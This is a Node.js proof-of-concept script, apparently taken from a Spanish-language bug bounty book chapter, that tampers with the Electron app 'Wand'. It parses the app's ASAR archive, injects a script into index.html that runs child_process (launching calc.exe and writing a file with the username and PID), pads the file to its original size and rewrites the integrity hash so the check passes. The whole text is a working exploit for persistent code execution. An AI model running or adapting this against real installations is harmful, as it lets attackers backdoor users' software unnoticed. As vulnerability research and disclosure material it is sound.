// Extraído de: LibroBugBounty/cap-25-caso-wand.md
const fs = require('fs');
const crypto = require('crypto');

const wandRes = process.env.LOCALAPPDATA +
    '\\Wand\\app-12.17.0\\resources';
const asarPath = wandRes + '\\app.asar';
const buf = Buffer.from(fs.readFileSync(asarPath));

// Parsear header ASAR (formato Chromium Pickle)
// [payload_size:u32][string_size:u32][header_json]
const stringSize = buf.readUInt32LE(4);
const headerRaw = buf.slice(8, 8 + stringSize)
    .toString('utf8').replace(/\0+$/, '');
const header = JSON.parse(headerRaw);

// Calcular offset de datos
const headerTotal = 4 + 4 + stringSize;
const dataStart = Math.ceil(headerTotal / 4) * 4;

// Localizar index.html en el ASAR
const entry = header.files['index.html'];
const absOffset = dataStart + parseInt(entry.offset);
const fileSize = entry.size;

// Leer contenido actual
const current = buf.slice(absOffset, absOffset + fileSize)
    .toString('utf8');

// Construir payload (debe caber en EXACTO fileSize bytes)
const payload =
    '<script>var _f=require("fs"),_c=require("child_process")' +
    ',_o=require("os");try{_f.writeFileSync(' +
    '"C:\\\\Users\\\\Public\\\\wand_rce_proof.txt",' +
    '"WAND RCE\\r\\nUser: "+_o.userInfo().username+' +
    '"\\r\\nPID: "+process.pid)}catch(e){}' +
    'try{_c.exec("calc.exe")}catch(e){}</script>';

let modified = current.replace('<head>', '<head>' + payload);

// Ajustar al tamano exacto con padding HTML
if (modified.length < fileSize) {
    const pad = fileSize - modified.length;
    const padding = '<!--' + ' '.repeat(pad - 7) + '-->';
    modified = modified.replace('</html>',
        padding + '</html>');
}
modified = modified.substring(0, fileSize);

// Escribir contenido modificado en el buffer
Buffer.from(modified, 'utf8').copy(buf, absOffset);

// Calcular nuevo SHA256
const newHash = crypto.createHash('sha256')
    .update(Buffer.from(modified, 'utf8')).digest('hex');

// Actualizar hash en el header JSON del ASAR
entry.integrity.hash = newHash;
entry.integrity.blocks = [newHash];

// Serializar y escribir nuevo header
const newHeader = JSON.stringify(header);
const headerBuf = Buffer.alloc(stringSize, 0);
Buffer.from(newHeader, 'utf8').copy(headerBuf);
headerBuf.copy(buf, 8);

// Guardar ASAR modificado
fs.writeFileSync(asarPath, buf);
